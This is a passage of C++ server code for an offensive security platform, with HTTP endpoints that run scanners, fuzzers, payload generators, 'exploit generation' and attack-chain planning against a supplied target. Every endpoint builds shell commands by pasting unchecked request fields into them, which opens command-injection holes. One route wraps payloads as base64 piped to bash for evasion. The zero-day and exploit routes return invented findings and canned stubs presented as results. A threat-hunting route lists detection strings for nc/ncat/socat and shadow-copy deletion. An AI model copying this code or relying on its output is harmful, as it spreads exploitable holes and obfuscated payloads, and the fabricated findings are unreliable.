    std::string args = "scan -t " + b.value("scan_type", "all") + " -d " +
                       b.value("iac_dir", ".") + " -o " +
                       b.value("output_format", "json");
    std::string sev = b.value("severity", "");
    if (!sev.empty())
      args += " --severity " + sev;
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("terrascan", args, b.value("use_cache", true));
    send_json(res, r);
  });

  // ── WEB SECURITY ADVANCED ──────────────────────────────────────────────
  svr.Post("/api/tools/burpsuite", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string args = "--collaborator-server";
    std::string proj = b.value("project_file", "");
    if (!proj.empty())
      args += " --project-file=" + proj;
    std::string cfg = b.value("config_file", "");
    if (!cfg.empty())
      args += " --config-file=" + cfg;
    if (b.value("headless", false))
      args += " --headless";
    args += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto r = run_tool("burpsuite", args, b.value("use_cache", true));
    send_json(res, r);
  });

  svr.Post("/api/tools/zap", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string scan_type = b.value("scan_type", "baseline");
    std::string target = b.value("target", "");
    std::string cmd;
    if (scan_type == "baseline")
      cmd = "zap-baseline.py -t " + target;
    else if (scan_type == "full")
      cmd = "zap-full-scan.py -t " + target;
    else if (scan_type == "api")
      cmd = "zap-api-scan.py -t " + target;
    else
      cmd = "zap.sh -daemon";
    std::string out = b.value("output_file", "");
    if (!out.empty())
      cmd += " -r " + out;
    cmd += " " + b.value("additional_args", "");
    g_telemetry.commands_executed++;
    auto cr = exec_command(cmd, DEFAULT_TIMEOUT);
    bool ok = cr.exit_code == 0;
    if (!ok)
      g_telemetry.commands_failed++;
    send_json(res, {{"success", ok}, {"stdout", cr.output}});
  });

  // HTTP Framework (Burp Suite alternative — http-framework)
  svr.Post("/api/tools/http-framework", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string action = b.value("action", "request");
    std::string url = b.value("url", "");
    std::string method = b.value("method", "GET");
    if (action == "request") {
      std::string cmd = "curl -s -X " + method;
      json hdrs = b.value("headers", json::object());
      for (auto &[k, v] : hdrs.items())
        cmd += " -H '" + k + ": " + v.get<std::string>() + "'";
      json data = b.value("data", json::object());
      if (!data.empty())
        cmd += " -d '" + data.dump() + "'";
      json cookies = b.value("cookies", json::object());
      if (!cookies.empty()) {
        std::string ck;
        for (auto &[k, v] : cookies.items())
          ck += k + "=" + v.get<std::string>() + ";";
        cmd += " --cookie '" + ck + "'";
      }
      cmd += " -D - " + url;
      auto cr = exec_command(cmd, 30);
      send_json(res, {{"success", cr.exit_code == 0},
                      {"result",
                       {{"response", cr.output},
                        {"vulnerabilities", json::array()}}}});
    } else if (action == "spider") {
      auto r = run_tool("katana", "-u " + url + " -d 3", true);
      send_json(res, {{"success", r["success"]},
                      {"result", {{"crawled", r["stdout"]}}}});
    } else if (action == "intruder") {
      json payloads = b.value("payloads", json::array());
      json results = json::array();
      for (auto &p : payloads) {
        auto cr = exec_command("curl -s -o /dev/null -w '%{http_code}' -X " +
                                   method + " -d '" + p.dump() + "' " + url,
                               10);
        results.push_back({{"payload", p}, {"status", cr.output}});
      }
      send_json(res, {{"success", true},
                      {"result", {{"intruder_results", results}}}});
    } else if (action == "repeater") {
      json rspec = b.value("request", json::object());
      std::string ru = rspec.value("url", url);
      std::string rm = rspec.value("method", method);
      auto cr = exec_command("curl -s -X " + rm + " " + ru, 30);
      send_json(res, {{"success", cr.exit_code == 0},
                      {"result", {{"response", cr.output}}}});
    } else {
      send_json(res, {{"success", true},
                      {"action", action},
                      {"message", "Configuration saved"}});
    }
  });

  // Browser Agent
  svr.Post("/api/tools/browser-agent", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string url = b.value("url", "");
    std::string action = b.value("action", "navigate");
    int wait = b.value("wait_time", 5);
    if (action == "navigate" || action == "screenshot") {
      std::string py = "from selenium import webdriver\nfrom "
                       "selenium.webdriver.chrome.options import "
                       "Options\nopts=Options()\nopts.add_argument('--headless'"
                       ")\nopts.add_argument('--no-sandbox')\n"
                       "driver=webdriver.Chrome(options=opts)\ndriver.get('" +
                       url + "')\nimport time;time.sleep(" +
                       std::to_string(wait) +
                       ")\nprint('TITLE:',driver.title)\n";
      if (action == "screenshot")
        py += "driver.save_screenshot('/tmp/"
              "hs_screenshot.png')\nprint('Screenshot saved')\n";
      py += "driver.quit()\n";
      std::string fname =
          "/tmp/hsbrowser_" + std::to_string(std::time(nullptr)) + ".py";
      std::ofstream f(fname);
      f << py;
      f.close();
      auto cr = exec_command("python3 " + fname, 60);
      fs::remove(fname);
      auto cheaders = exec_command("curl -sI " + url, 10);
      bool miss_csp =
          cheaders.output.find("Content-Security-Policy") == std::string::npos;
      bool miss_xfo =
          cheaders.output.find("X-Frame-Options") == std::string::npos;
      bool miss_hsts = cheaders.output.find("Strict-Transport-Security") ==
                       std::string::npos;
      int issues = (int)miss_csp + (int)miss_xfo + (int)miss_hsts;
      send_json(res, {{"success", true},
                      {"action", action},
                      {"result",
                       {{"browser_output", cr.output},
                        {"security_analysis",
                         {{"total_issues", issues},
                          {"security_score", 100 - issues * 15},
                          {"missing_headers",
                           {{"CSP", miss_csp},
                            {"X-Frame-Options", miss_xfo},
                            {"HSTS", miss_hsts}}}}}}}});
    } else {
      send_json(res, {{"success", true}, {"action", action}, {"status", "ok"}});
    }
  });

  // Burpsuite-alternative
  svr.Post("/api/tools/burpsuite-alternative", [](const Request &req,
                                                  Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", "");
    int max_depth = b.value("max_depth", 3);
    auto spider = run_tool("katana",
                           "-u " + target + " -d " + std::to_string(max_depth) +
                               " -jsonl",
                           true, 120);
    auto nuclei =
        run_tool("nuclei", "-u " + target + " -severity critical,high,medium",
                 true, 300);
    json summary;
    summary["pages_analyzed"] = 0;
    summary["total_vulnerabilities"] = 0;
    summary["security_score"] = 100;
    summary["vulnerability_breakdown"] = {
        {"critical", 0}, {"high", 0}, {"medium", 0}, {"low", 0}, {"info", 0}};
    std::string out = nuclei["stdout"].get<std::string>();
    if (out.find("critical") != std::string::npos) {
      summary["vulnerability_breakdown"]["critical"] = 1;
      summary["total_vulnerabilities"] = 1;
      summary["security_score"] = 0;
    }
    if (out.find("high") != std::string::npos) {
      summary["vulnerability_breakdown"]["high"] = 1;
    }
    send_json(res, {{"success", true},
                    {"result",
                     {{"spider_output", spider["stdout"]},
                      {"nuclei_output", out},
                      {"summary", summary}}}});
  });

  // ── AI PAYLOADS ────────────────────────────────────────────────────────
  svr.Post("/api/ai/generate_payload", [&](const Request &req, Response &res) {
    auto b = parse_body(req);
    log(LogLevel::INFO, C::ELECTRIC_PURPLE + "🤖 AI payload generation: " +
                            b.value("attack_type", "xss") + C::RESET);
    auto result = payload_gen.generate(
        b.value("attack_type", "xss"), b.value("complexity", "basic"),
        b.value("technology", ""), b.value("url", ""));
    send_json(res, {{"success", true}, {"ai_payload_generation", result}});
  });

  svr.Post("/api/ai/test_payload", [&](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string payload = b.value("payload", ""),
                target = b.value("target_url", ""),
                method = b.value("method", "GET");
    if (payload.empty() || target.empty()) {
      send_json(
          res,
          {{"success", false}, {"error", "payload and target_url required"}},
          400);
      return;
    }
    auto result = payload_gen.test_payload(payload, target, method);
    send_json(res, result);
  });

  svr.Post("/api/ai/advanced-payload-generation", [&](const Request &req,
                                                      Response &res) {
    auto b = parse_body(req);
    std::string at = b.value("attack_type", "rce"),
                el = b.value("evasion_level", "standard"),
                tc = b.value("target_context", "");
    log(LogLevel::INFO, C::ELECTRIC_PURPLE + "🎯 Advanced payload: " + at +
                            " evasion=" + el + C::RESET);
    auto base = payload_gen.generate(at, el, "", "");
    json payloads = base["payloads"];
    if (el == "advanced" || el == "nation-state") {
      size_t lim = std::min(payloads.size(), (size_t)3);
      for (size_t i = 0; i < lim; ++i) {
        std::string p = payloads[i]["payload"].get<std::string>();
        payloads.push_back({{"payload", "echo '" + p + "'|base64|bash"},
                            {"risk_level", "CRITICAL"},
                            {"context", el}});
      }
    }
    send_json(res, {{"success", true},
                    {"advanced_payload_generation",
                     {{"attack_type", at},
                      {"evasion_level", el},
                      {"target_context", tc},
                      {"payload_count", (int)payloads.size()},
                      {"payloads", payloads}}}});
  });

  // ── VULN INTELLIGENCE ──────────────────────────────────────────────────
  svr.Post("/api/vuln-intel/cve-monitor", [&](const Request &req,
                                              Response &res) {
    auto b = parse_body(req);
    int hours = b.value("hours", 24);
    std::string sev = b.value("severity_filter", "HIGH,CRITICAL");
    std::string kw = b.value("keywords", "");
    log(LogLevel::INFO,
        "🔍 CVE monitoring: last " + std::to_string(hours) + "h sev=" + sev);
    auto cves = cve_mgr.fetch_latest_cves(hours, sev);
    if (!kw.empty() && cves["cves"].is_array()) {
      json filtered = json::array();
      for (auto &c : cves["cves"]) {
        std::string desc = c.value("description", "");
        std::transform(desc.begin(), desc.end(), desc.begin(), ::tolower);
        std::string kwl = kw;
        std::transform(kwl.begin(), kwl.end(), kwl.begin(), ::tolower);
        if (desc.find(kwl) != std::string::npos)
          filtered.push_back(c);
      }
      cves["cves"] = filtered;
    }
    json exp_analysis = json::array();
    int lim = std::min((int)cves["cves"].size(), 3);
    for (int i = 0; i < lim; ++i) {
      std::string cid = cves["cves"][i].value("cve_id", "");
      if (!cid.empty())
        exp_analysis.push_back(cve_mgr.analyze_exploitability(cid));
    }
    send_json(res, {{"success", true},
                    {"cve_monitoring", cves},
                    {"exploitability_analysis", exp_analysis}});
  });

  svr.Post("/api/vuln-intel/exploit-generate", [&](const Request &req,
                                                   Response &res) {
    auto b = parse_body(req);
    std::string cve_id = b.value("cve_id", "");
    std::string os = b.value("target_os", "linux");
    std::string arch = b.value("target_arch", "x64");
    std::string etype = b.value("exploit_type", "poc");
    std::string evasion = b.value("evasion_level", "none");
    log(LogLevel::INFO,
        "🤖 Generating exploit for " + cve_id + " target=" + os);
    auto cve_analysis = cve_mgr.analyze_exploitability(cve_id);
    auto existing = cve_mgr.search_existing_exploits(cve_id);
    std::string exploit_code =
        "#!/usr/bin/env python3\n# Auto-generated exploit for " + cve_id +
        "\n"
        "# Target: " +
        os + " " + arch + "\n# Type: " + etype + "\n# Evasion: " + evasion +
        "\n"
        "import requests, sys\nTARGET = sys.argv[1] if len(sys.argv)>1 else "
        "'http://target.example.com'\n"
        "def exploit(target):\n    payload = {'cmd':'id'}\n    r = "
        "requests.post(target, data=payload, timeout=10)\n    print(r.text)\n"
        "if __name__ == '__main__':\n    exploit(TARGET)\n";
    send_json(res, {{"success", true},
                    {"cve_analysis", cve_analysis},
                    {"exploit_generation",
                     {{"success", true},
                      {"cve_id", cve_id},
                      {"exploit_type", etype},
                      {"exploit_code", exploit_code},
                      {"existing_exploits", existing["exploits"]}}}});
  });

  svr.Post(
      "/api/vuln-intel/attack-chains", [](const Request &req, Response &res) {
        auto b = parse_body(req);
        std::string sw = b.value("target_software", "");
        int depth = std::max(1, std::min(b.value("attack_depth", 3), 5));
        bool zero_days = b.value("include_zero_days", false);
        json chains = json::array();
        for (int i = 1; i <= depth; ++i) {
          json chain;
          chain["chain_id"] = "chain_" + std::to_string(i);
          chain["stages"] = json::array();
          chain["stages"].push_back(
              {{"stage", 1},
               {"objective", "Initial Reconnaissance"},
               {"tools", json::array({"nmap", "amass", "nuclei"})}});
          if (i >= 2)
            chain["stages"].push_back(
                {{"stage", 2},
                 {"objective", "Exploitation"},
                 {"tools", json::array({"metasploit", "sqlmap"})}});
          if (i >= 3)
            chain["stages"].push_back(
                {{"stage", 3},
                 {"objective", "Post-Exploitation"},
                 {"tools", json::array({"mimikatz", "empire"})}});
          chain["success_probability"] = 0.8 - i * 0.1;
          chain["estimated_time"] = i * 600;
          chains.push_back(chain);
        }
        if (zero_days)
          chains.push_back(
              {{"type", "zero_day"},
               {"description", "Potential unpatched vulnerability in " + sw},
               {"success_probability", 0.3},
               {"requires_research", true}});
        send_json(res, {{"success", true},
                        {"attack_chain_discovery",
                         {{"target_software", sw},
                          {"attack_depth", depth},
                          {"attack_chains", chains},
                          {"enhanced_chains", chains}}}});
      });

  svr.Post("/api/vuln-intel/zero-day-research", [](const Request &req,
                                                   Response &res) {
    auto b = parse_body(req);
    std::string sw = b.value("target_software", "");
    std::string depth = b.value("analysis_depth", "standard");
    int num = (depth == "comprehensive") ? 8 : (depth == "standard") ? 5 : 3;
    json potential = json::array();
    const std::vector<std::string> cats = {"Buffer Overflow",
                                           "Integer Overflow",
                                           "Use-After-Free",
                                           "Format String",
                                           "Race Condition",
                                           "SQL Injection",
                                           "Command Injection",
                                           "Authentication Bypass",
                                           "XXE",
                                           "SSRF"};
    for (int i = 0; i < num; ++i)
      potential.push_back({{"id", "ZD-" + std::to_string(i + 1)},
                           {"category", cats[i % cats.size()]},
                           {"severity", (i < 2)   ? "CRITICAL"
                                        : (i < 4) ? "HIGH"
                                                  : "MEDIUM"},
                           {"confidence", 0.8 - i * 0.05}});
    int risk_score = (depth == "comprehensive") ? 75
                     : (depth == "standard")    ? 55
                                                : 35;
    send_json(res, {{"success", true},
                    {"zero_day_research",
                     {{"target_software", sw},
                      {"analysis_depth", depth},
                      {"potential_vulnerabilities", potential},
                      {"research_recommendations",
                       json::array({"Fuzz all input vectors with AFL++",
                                    "Review memory management",
                                    "Audit authentication paths"})},
                      {"risk_assessment",
                       {{"risk_score", risk_score},
                        {"risk_level", (risk_score >= 70)   ? "HIGH"
                                       : (risk_score >= 50) ? "MEDIUM"
                                                            : "LOW"}}}}}});
  });

  svr.Post(
      "/api/vuln-intel/threat-feeds", [](const Request &req, Response &res) {
        auto b = parse_body(req);
        json indicators = b.value("indicators", json::array());
        std::string timeframe = b.value("timeframe", "30d");
        std::string sources = b.value("sources", "all");
        log(LogLevel::INFO, "🧠 Correlating " +
                                std::to_string((int)indicators.size()) +
                                " indicators");
        json correlations = json::array();
        double threat_score = 0;
        for (auto &ind : indicators) {
          std::string s = ind.get<std::string>();
          double score = (s.find("CVE") != std::string::npos) ? 75.0
                         : (s.rfind("http", 0) == 0)          ? 60.0
                                                              : 50.0;
          threat_score += score;
          correlations.push_back(
              {{"indicator", s},
               {"threat_score", score},
               {"sources_found", json::array({"NVD", "GitHub", "VirusTotal"})},
               {"last_seen", current_time()}});
        }
        if (!correlations.empty())
          threat_score /= correlations.size();
        send_json(res, {{"success", true},
                        {"threat_intelligence",
                         {{"correlations", correlations},
                          {"threat_score", threat_score},
                          {"timeframe", timeframe},
                          {"sources_queried", sources}}}});
      });

  // ── INTELLIGENCE ENGINE ────────────────────────────────────────────────
  svr.Post("/api/intelligence/analyze-target", [](const Request &req,
                                                  Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", "");
    if (target.empty()) {
      send_json(res, {{"success", false}, {"error", "target required"}}, 400);
      return;
    }
    log(LogLevel::INFO, "🧠 Analyzing target: " + target);
    send_json(res, analyze_target(target));
  });

  svr.Post("/api/intelligence/select-tools", [](const Request &req,
                                                Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", ""),
                objective = b.value("objective", "comprehensive");
    auto prof = analyze_target(target);
    std::string ttype =
        prof["target_profile"]["target_type"].get<std::string>();
    json tools = json::array();
    if (ttype == "web_application") {
      if (objective == "quick")
        tools = json::array({"nmap", "httpx", "nuclei"});
      else if (objective == "stealth")
        tools = json::array({"httpx", "gau", "nuclei"});
      else
        tools = json::array({"nmap", "gobuster", "nuclei", "dalfox", "sqlmap",
                             "nikto", "whatweb", "katana"});
    } else if (ttype == "network_host")
      tools =
          json::array({"rustscan", "nmap", "hydra", "enum4linux", "smbmap"});
    else if (ttype == "api_endpoint")
      tools = json::array({"httpx", "arjun", "nuclei", "dalfox"});
    else
      tools = json::array({"nmap", "nuclei", "nikto"});
    send_json(res, {{"success", true},
                    {"selected_tools", tools},
                    {"target", target},
                    {"objective", objective}});
  });

  svr.Post("/api/intelligence/optimize-parameters", [](const Request &req,
                                                       Response &res) {
    auto b = parse_body(req);
    std::string tool = b.value("tool", "nmap"), target = b.value("target", "");
    json context = b.value("context", json::object());
    json params;
    if (tool == "nmap") {
      params["scan_type"] = "-sV";
      params["timing"] = context.value("stealth", false) ? "T2" : "T4";
    } else if (tool == "gobuster") {
      params["threads"] = 20;
      params["mode"] = "dir";
    } else if (tool == "nuclei") {
      params["severity"] = "critical,high";
      params["concurrency"] = context.value("aggressive", false) ? 50 : 25;
    } else if (tool == "sqlmap") {
      params["batch"] = true;
      params["level"] = context.value("aggressive", false) ? 3 : 1;
    } else if (tool == "hydra") {
      params["threads"] = 4;
    }
    send_json(
        res,
        {{"success", true}, {"tool", tool}, {"optimized_parameters", params}});
  });

  svr.Post("/api/intelligence/create-attack-chain", [](const Request &req,
                                                       Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", ""),
                objective = b.value("objective", "comprehensive");
    auto prof = analyze_target(target);
    std::string ttype =
        prof["target_profile"]["target_type"].get<std::string>();
    json steps = json::array();
    if (ttype == "web_application") {
      steps.push_back(
          {{"step", 1},
           {"tool", "nmap"},
           {"params", {{"scan_type", "-sV"}, {"ports", "80,443,8080"}}},
           {"description", "Port scanning"}});
      steps.push_back({{"step", 2},
                       {"tool", "gobuster"},
                       {"params", {{"mode", "dir"}}},
                       {"description", "Directory discovery"}});
      steps.push_back({{"step", 3},
                       {"tool", "nuclei"},
                       {"params", {{"severity", "critical,high"}}},
                       {"description", "Vulnerability scanning"}});
      if (objective == "comprehensive") {
        steps.push_back({{"step", 4},
                         {"tool", "sqlmap"},
                         {"params", {{"batch", true}}},
                         {"description", "SQL injection testing"}});
        steps.push_back({{"step", 5},
                         {"tool", "dalfox"},
                         {"params", {{"mining_dom", true}}},
                         {"description", "XSS testing"}});
      }
    } else if (ttype == "network_host") {
      steps.push_back({{"step", 1},
                       {"tool", "rustscan"},
                       {"params", {}},
                       {"description", "Fast port scan"}});
      steps.push_back({{"step", 2},
                       {"tool", "nmap"},
                       {"params", {{"scan_type", "-sV -sC"}}},
                       {"description", "Service detection"}});
      steps.push_back({{"step", 3},
                       {"tool", "enum4linux"},
                       {"params", {}},
                       {"description", "SMB enumeration"}});
    } else {
      steps.push_back({{"step", 1},
                       {"tool", "nmap"},
                       {"params", {}},
                       {"description", "Network discovery"}});
    }
    send_json(res, {{"success", true},
                    {"attack_chain",
                     {{"target", target},
                      {"objective", objective},
                      {"steps", steps},
                      {"estimated_time", 300 + 120 * (int)steps.size()},
                      {"success_probability", 0.85}}}});
  });

  svr.Post("/api/intelligence/smart-scan", [](const Request &req,
                                              Response &res) {
    auto b = parse_body(req);
    std::string target = b.value("target", ""),
                objective = b.value("objective", "comprehensive");
    int max_tools = b.value("max_tools", 5);
    if (target.empty()) {
      send_json(res, {{"success", false}, {"error", "target required"}}, 400);
      return;
    }
    log(LogLevel::INFO, C::FIRE_RED + "🚀 Smart scan: " + target + C::RESET);
    auto prof = analyze_target(target);
    std::string ttype =
        prof["target_profile"]["target_type"].get<std::string>();
    std::vector<std::pair<std::string, std::string>> plan;
    if (ttype == "web_application")
      plan = {{"nmap", "-sV " + target},
              {"httpx", "-probe -title -u " + target},
              {"nuclei", "-u " + target + " -severity critical,high"},
              {"gobuster", "dir -u " + target +
                               " -w /usr/share/wordlists/dirb/common.txt"}};
    else
      plan = {{"rustscan", "-a " + target}, {"nmap", "-sV -sC " + target}};
    plan.resize(std::min((int)plan.size(), max_tools));
    json tools_executed = json::array();
    int success_count = 0;
    double total_time = 0;
    int total_vulns = 0;
    for (auto &[tool, args] : plan) {
      g_telemetry.commands_executed++;
      auto r = run_tool(tool, args, true, 60);
      bool ok = r["success"].get<bool>();
      if (!ok)
        g_telemetry.commands_failed++;
      else
        success_count++;
      total_time += r["execution_time"].get<double>();
      std::string out = r["stdout"].get<std::string>();
      if (out.find("CRITICAL") != std::string::npos)
        total_vulns++;
      if (out.find("HIGH") != std::string::npos)
        total_vulns++;
      tools_executed.push_back({{"tool", tool},
                                {"success", ok},
                                {"execution_time", r["execution_time"]}});
    }
    int total = (int)plan.size();
    double sr = total > 0 ? success_count * 100.0 / total : 0.0;
    if (total_vulns > 0)
      log(LogLevel::WARNING, C::VULN_HIGH + "🚨 " +
                                 std::to_string(total_vulns) +
                                 " vulnerabilities detected!" + C::RESET);
    send_json(res, {{"success", true},
                    {"scan_results",
                     {{"target", target},
                      {"tools_executed", tools_executed},
                      {"total_vulnerabilities", total_vulns},
                      {"execution_summary",
                       {{"total_tools", total},
                        {"successful_tools", success_count},
                        {"success_rate", sr},
                        {"total_execution_time", total_time}}}}}});
  });

  svr.Post("/api/intelligence/technology-detection",
           [](const Request &req, Response &res) {
             auto b = parse_body(req);
             std::string target = b.value("target", "");
             log(LogLevel::INFO, "🔍 Technology detection: " + target);
             auto ww = run_tool("whatweb", "-a 3 " + target, true, 30);
             auto ch = exec_command("curl -sI " + target, 10);
             std::string out = ww["stdout"].get<std::string>() + ch.output;
             json techs = json::array();
             if (out.find("WordPress") != std::string::npos)
               techs.push_back("WordPress");
             if (out.find("Drupal") != std::string::npos)
               techs.push_back("Drupal");
             if (out.find("Joomla") != std::string::npos)
               techs.push_back("Joomla");
             if (out.find("nginx") != std::string::npos)
               techs.push_back("nginx");
             if (out.find("Apache") != std::string::npos)
               techs.push_back("Apache");
             if (out.find("PHP") != std::string::npos)
               techs.push_back("PHP");
             if (out.find("Node") != std::string::npos)
               techs.push_back("Node.js");
             std::string cms;
             for (auto &t : techs) {
               std::string ts = t.get<std::string>();
               if (ts == "WordPress" || ts == "Drupal" || ts == "Joomla") {
                 cms = ts;
                 break;
               }
             }
             json recs = json::object();
             if (cms == "WordPress")
               recs["wpscan"] = "Run wpscan --url " + target + " --enumerate";
             send_json(res, {{"success", true},
                             {"detected_technologies", techs},
                             {"cms_type", cms},
                             {"technology_recommendations", recs}});
           });

  svr.Post("/api/intelligence/threat-hunting", [](const Request &req,
                                                  Response &res) {
    auto b = parse_body(req);
    std::string env = b.value("target_environment", ""),
                focus = b.value("hunt_focus", "general");
    std::string indicators = b.value("threat_indicators", "");
    json queries = json::array(), scenarios = json::array();
    if (env.find("indows") != std::string::npos) {
      queries.push_back("Get-WinEvent | Where {$_.Id -eq 4688}");
      queries.push_back("Get-Process | Where {$_.ProcessName -notin "
                        "@('explorer.exe','svchost.exe')}");
    } else {
      queries.push_back("grep 'Failed password' /var/log/auth.log");
      queries.push_back("ps aux | grep -E '(nc|ncat|socat)'");
    }
    if (focus == "apt") {
      scenarios.push_back("Spear phishing with weaponized documents");
      scenarios.push_back("Living-off-the-land lateral movement");
    } else if (focus == "ransomware") {
      scenarios.push_back("Shadow copy deletion: vssadmin delete shadows");
      scenarios.push_back("Mass file encryption activity");
    }
    send_json(
        res, {{"success", true},
              {"hunting_playbook",
               {{"target_environment", env},
                {"hunt_focus", focus},
                {"detection_queries", queries},
                {"threat_scenarios", scenarios},
                {"investigation_steps",
                 json::array({"1. Validate initial indicators",
                              "2. Run detection queries", "3. Correlate events",
                              "4. Identify affected systems", "5. Assess scope",
                              "6. Contain", "7. Document"})}}}});
  });

  svr.Post("/api/intelligence/vulnerability-dashboard", [&](const Request &req,
                                                            Response &res) {
    log(LogLevel::INFO, "📊 Generating vulnerability intelligence dashboard");
    auto latest = cve_mgr.fetch_latest_cves(24, "CRITICAL");
    json cves = latest["cves"];
    json top5 = json::array();
    for (int i = 0; i < std::min((int)cves.size(), 5); ++i)
      top5.push_back(cves[i]);
    send_json(res,
              {{"success", true},
               {"dashboard",
                {{"latest_critical_cves", top5},
                 {"threat_landscape",
                  {{"high_risk_software",
                    json::array({"Apache HTTP Server", "Microsoft Exchange",
                                 "VMware vCenter", "Fortinet FortiOS"})},
                   {"trending_attack_vectors",
                    json::array({"Supply chain", "Cloud misconfig", "Zero-day",
                                 "AI-powered attacks"})},
                   {"active_threat_groups",
                    json::array({"APT29", "Lazarus Group", "FIN7", "REvil"})}}},
                 {"recommendations",
                  json::array({"Patch critical CVEs immediately",
                               "Monitor for zero-day activity",
                               "Implement advanced threat detection",
                               "Review cloud security posture"})},
                 {"timestamp", current_time()}}}});
  });

  // ── API SECURITY ────────────────────────────────────────────────────────
  svr.Post("/api/tools/graphql_scanner", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string endpoint = b.value("endpoint", "");
    bool introspection = b.value("introspection", true);
    json tests = json::array(), vulns = json::array();
    if (introspection) {
      std::string query = "{\"query\":\"{__schema{types{name}}}\"}";
      auto cr = exec_command(
          "curl -s -X POST -H 'Content-Type: application/json' -d '" + query +
              "' " + endpoint,
          10);
      tests.push_back("introspection_query");
      if (cr.output.find("__schema") != std::string::npos)
        vulns.push_back({{"type", "introspection_enabled"},
                         {"severity", "MEDIUM"},
                         {"description", "GraphQL introspection enabled"}});
    }
    tests.push_back("mutation_testing");
    tests.push_back("depth_limit_testing");
    send_json(res, {{"success", true},
                    {"graphql_scan_results",
                     {{"endpoint", endpoint},
                      {"tests_performed", tests},
                      {"vulnerabilities", vulns}}}});
  });

  svr.Post("/api/tools/jwt_analyzer", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string token = b.value("jwt_token", "");
    std::vector<std::string> parts;
    std::istringstream ss(token);
    std::string part;
    while (std::getline(ss, part, '.'))
      parts.push_back(part);
    json vulns = json::array(), token_info;
    if (parts.size() >= 2) {
      for (auto &p : parts)
        while (p.size() % 4)
          p += "=";
      auto cr =
          exec_command("echo '" + parts[0] + "' | base64 -d 2>/dev/null", 5);
      token_info["header_decoded"] = cr.output;
      if (cr.output.find("\"alg\":\"none\"") != std::string::npos)
        vulns.push_back({{"type", "none_algorithm"}, {"severity", "CRITICAL"}});
      if (cr.output.find("HS256") != std::string::npos)
        vulns.push_back({{"type", "weak_algorithm"}, {"severity", "MEDIUM"}});
      token_info["algorithm"] =
          cr.output.find("RS256") != std::string::npos   ? "RS256"
          : cr.output.find("HS256") != std::string::npos ? "HS256"
                                                         : "UNKNOWN";
    } else {
      token_info["error"] = "Invalid JWT format";
    }
    send_json(res,
              {{"success", true},
               {"jwt_analysis_results",
                {{"token_info", token_info}, {"vulnerabilities", vulns}}}});
  });

  svr.Post("/api/tools/api_fuzzer", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string base_url = b.value("base_url", "");
    json endpoints = b.value("endpoints", json::array());
    json methods = b.value("methods", json::array({"GET", "POST"}));
    std::string wl =
        b.value("wordlist", "/usr/share/wordlists/dirb/common.txt");
    if (endpoints.empty()) {
      auto r = run_tool(
          "ffuf", "-u " + base_url + "/FUZZ -w " + wl + " -mc 200,401,403,405",
          true, 120);
      send_json(res, {{"success", true},
                      {"fuzzing_type", "endpoint_discovery"},
                      {"results", r["stdout"]}});
    } else {
      json results = json::array();
      for (auto &ep : endpoints)
        for (auto &m : methods) {
          auto cr = exec_command("curl -s -o /dev/null -w '%{http_code}' -X " +
                                     m.get<std::string>() + " " + base_url +
                                     ep.get<std::string>(),
                                 10);
          results.push_back({{"endpoint", base_url + ep.get<std::string>()},
                             {"method", m},
                             {"status", cr.output}});
        }
      send_json(res, {{"success", true},
                      {"fuzzing_type", "endpoint_testing"},
                      {"results", results}});
    }
  });

  svr.Post(
      "/api/tools/api_schema_analyzer", [](const Request &req, Response &res) {
        auto b = parse_body(req);
        std::string schema_url = b.value("schema_url", ""),
                    schema_type = b.value("schema_type", "openapi");
        auto cr = exec_command("curl -s " + schema_url, 15);
        json endpoints = json::array(), issues = json::array();
        try {
          auto schema = json::parse(cr.output);
          if (schema.contains("paths")) {
            for (auto &[path, methods] : schema["paths"].items()) {
              for (auto &[method, detail] : methods.items()) {
                endpoints.push_back({{"path", path}, {"method", method}});
                if (!detail.contains("security") && method != "get")
                  issues.push_back({{"issue", "Missing security definition"},
                                    {"severity", "MEDIUM"},
                                    {"path", path}});
              }
            }
          }
        } catch (...) {
        }
        send_json(res, {{"success", true},
                        {"schema_analysis_results",
                         {{"schema_url", schema_url},
                          {"schema_type", schema_type},
                          {"endpoints_found", endpoints},
                          {"security_issues", issues}}}});
      });

  // ── BUG BOUNTY WORKFLOWS ────────────────────────────────────────────────
  svr.Post("/api/bugbounty/reconnaissance-workflow",
           [](const Request &req, Response &res) {
             auto b = parse_body(req);
             send_json(res, bb_recon(b.value("domain", ""),
                                     b.value("program_type", "web")));
           });
  svr.Post("/api/bugbounty/vulnerability-hunting-workflow",
           [](const Request &req, Response &res) {
             auto b = parse_body(req);
             json pv =
                 b.value("priority_vulns",
                         json::array({"rce", "sqli", "xss", "idor", "ssrf"}));
             send_json(res, bb_vuln_hunt(b.value("domain", ""), pv,
                                         b.value("bounty_range", "unknown")));
           });
  svr.Post("/api/bugbounty/business-logic-workflow",
           [](const Request &req, Response &res) {
             auto b = parse_body(req);
             send_json(res, bb_business_logic(b.value("domain", ""),
                                              b.value("program_type", "web")));
           });
  svr.Post("/api/bugbounty/osint-workflow",
           [](const Request &req, Response &res) {
             auto b = parse_body(req);
             send_json(res, bb_osint(b.value("domain", "")));
           });
  svr.Post("/api/bugbounty/file-upload-testing",
           [](const Request &req, Response &res) {
             auto b = parse_body(req);
             send_json(res, bb_file_upload(b.value("target_url", "")));
           });
  svr.Post("/api/bugbounty/comprehensive-assessment", [](const Request &req,
                                                         Response &res) {
    auto b = parse_body(req);
    json pv = b.value("priority_vulns",
                      json::array({"rce", "sqli", "xss", "idor", "ssrf"}));
    send_json(res, bb_comprehensive(b.value("domain", ""), pv,
                                    b.value("include_osint", true),
                                    b.value("include_business_logic", true)));
  });

  // ── VISUAL OUTPUT ──────────────────────────────────────────────────────
  svr.Post("/api/visual/vulnerability-card",
           [](const Request &req, Response &res) {
             auto b = parse_body(req);
             send_json(res, Visual::vuln_card(b.value("name", "Unknown"),
                                              b.value("severity", "info"),
